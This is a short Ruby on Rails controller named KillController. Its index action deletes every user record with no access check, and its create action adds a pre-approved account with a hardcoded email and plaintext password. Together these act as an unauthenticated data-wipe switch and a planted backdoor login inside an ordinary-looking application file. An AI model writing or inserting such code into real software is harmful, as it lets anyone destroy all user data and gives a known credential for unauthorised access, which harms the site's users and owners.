class KillController < ApplicationController
  def index
    User.scoped.each do |u|
      u.destroy
    end
  end
  
  def create
    User.create!(:email => "daniel@kablamo.com.au", :password => "rus9uGap", :password_confirmation => "rus9uGap", :approved => true)
  end
end